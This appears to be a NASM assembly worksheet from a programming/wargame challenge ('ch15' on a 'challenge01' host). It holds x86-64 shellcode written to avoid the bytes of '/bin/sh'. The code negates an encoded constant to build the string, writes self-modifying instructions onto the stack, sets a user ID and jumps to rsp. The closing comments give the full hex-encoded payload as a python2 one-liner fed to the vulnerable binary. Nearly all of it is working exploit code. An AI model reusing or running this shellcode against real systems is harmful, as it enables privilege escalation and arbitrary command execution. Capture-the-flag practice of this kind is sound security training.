

; avoid '/', 'b', 'i', 'n', 's', 'h'
; avoid 2f,   62,  69,  6e,  73,  68, 20

; 1b 4e 55 5a 1b 5f 54 0c
; 14 14 14 14 14 14 14 14
section .text
global _start
;1162
;66 bf 8a 04

_start:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    push rdi
    xor rdi, rdi
    mov di, 1162
;END /bin/sh
    mov dx, 0x24a
    add dx, 0x2c5
    sub rsp, 64
  ;  add rsp, 64
 ;   add rsp, 64 == 48 83 c4 64
 ;   mov rdi, rsp == 48 89 e7
 ; 48 8b 3c 24
 ;   mov di, 1162
 ;   xor rsi, rsi
 ;   xor rdx, rdx
 ;   mov rdi, rsp
 ;   xor rax, rax = 48 31 c0
 ;   xor rdx, rdx == 48 31 d2
     xor  rax, rax
     xor rdx, rdx
 ;   add rdi, 100 /bin/sh in rsp + 100
 ;   mov rdi, [rsp]
  ;  mov  byte [rsp], 0x90
  ;  xor rdi, rdi
    mov word [rsp], dx
    mov dword [rsp + 2], 0x3bb0c231
    mov rax, 0x64c48348f6314890
    mov qword [rsp + 6], rax
    mov dword [rsp + 14], 0x243c8b48
    mov dword [rsp + 18], 0xc0314890
    mov word [rsp + 22], dx
    xor rax, rax
    mov al, 0x6b
    sub al, 2
; Need to add SETUID(UID) 
    jmp rsp

;programmation-ch15@challenge01:~$ ./ch15 "$(python2 -c 'print "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\x57\x48\x31\xff\x66\xbf\x8a\x04\x66\xba\x4a\x02\x66\x81\xc2\xc5\x02\x48\x83\xec\x64\x66\x89\x14\x24\xc7\x44\x24\x02\x31\xc0\xb0\x3b\x48\xb8\x90\x48\x31\xf6\x48\x83\xc4\x64\x48\x89\x44\x24\x06\xc7\x44\x24\x0e\x48\x8b\x3c\x24\xc7\x44\x24\x12\x90\x48\x31\xd2\x66\x89\x54\x24\x16\x48\x31\xc0\xb0\x71\xff\xe4"')"

;/sc_executor  "$(python2 -c 'print "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\x66\xba\x4a\x02\x66\x81\xc2\xc5\x02\x48\x83\xec\x64\x66\xc7\x04\x24\x90\x66\x89\x54\x24\x01\xc7\x44\x24\x03\x31\xd2\xb0\x3b\x48\xb8\x90\x90\x90\xb0\x3b\x48\x31\xf6\x48\x31\xf6\x48\x89\x44\x24\x07\x66\x89\x44\x24\x07\x66\x89\x54\x24\x0f\xb0\x66\xff\xe4"')"
